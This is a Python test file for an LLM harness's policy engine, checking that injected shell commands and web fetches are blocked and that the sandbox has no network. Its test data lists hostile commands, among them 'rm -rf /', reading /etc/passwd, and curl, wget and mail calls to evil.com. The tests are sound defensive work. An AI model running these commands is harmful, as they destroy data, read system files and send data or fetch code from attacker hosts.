from scripts.llm_harness.policy import PolicyEngine


def test_command_injection_blocked():
    """Verify that command injection payloads are rejected by PolicyEngine."""
    engine = PolicyEngine()
    
    injections = [
        "rm -rf /; echo hacked",
        "cat /etc/passwd && curl http://evil.com",
        "make && wget http://evil.com/script.sh",
        "echo hello | mail -s hacked evil@evil.com",
    ]
    
    for cmd in injections:
        decision = engine.evaluate_shell_command(cmd)
        assert not decision.allowed, f"Expected command '{cmd}' to be blocked"

def test_web_fetch_blocked_by_default():
    """Verify that web fetching commands are blocked by default policy."""
    engine = PolicyEngine()
    
    fetch_commands = [
        "curl -fsSL https://get.docker.com",
        "wget -O- http://malicious.site",
    ]
    
    for cmd in fetch_commands:
        decision = engine.evaluate_shell_command(cmd)
        assert not decision.allowed
        assert "not in the allowlist" in decision.reason

def test_docker_network_none_by_default():
    """Verify that sandbox network defaults to 'none'."""
    from scripts.llm_harness.config import HarnessConfig
    config = HarnessConfig()
    assert config.sandbox_network == "none"
